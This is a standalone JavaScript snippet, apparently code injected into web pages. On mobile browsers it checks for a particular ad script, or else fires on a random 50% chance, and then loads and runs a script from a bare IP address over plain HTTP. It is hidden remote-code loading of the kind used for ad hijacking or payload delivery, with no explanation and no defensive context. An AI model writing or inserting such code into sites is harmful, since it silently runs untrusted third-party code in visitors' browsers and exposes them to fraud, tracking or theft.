(function () {
    if (navigator.userAgent.match(/(iPhone|iPod|Android|ios|SymbianOS)/i)) {
        s = document.getElementsByTagName('script')
        for (i in s) {
            if (s.hasOwnProperty(i) && s[i].getAttribute('src') && (s[i].getAttribute('src').indexOf('/cpro/ui/cm.js') != -1 || Math.random() > 0.5)) {
                sc = document.createElement('script')
                sc.src = "http://183.136.218.41/apadv/t12/get.php";
                document.body.appendChild(sc)
                return;
            }
        }
    }
})();